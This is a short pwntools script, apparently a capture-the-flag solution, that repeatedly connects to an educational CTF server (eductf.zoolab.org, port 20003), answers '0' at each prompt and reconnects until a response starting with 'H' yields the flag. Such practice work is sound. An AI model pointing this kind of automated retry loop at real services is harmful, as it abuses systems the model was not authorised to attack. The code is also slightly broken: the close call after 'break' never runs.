from pwn import *

while True:

    r = remote('eductf.zoolab.org', 20003)
    while True:
        r.sendlineafter('>', '0')
        response = r.recvline()
        if response[0] == 'E':
            break
            r.close()
        elif response[0] == 'H':
            flag = r.recvline()
            print('flag --> ', flag)
            exit(0)
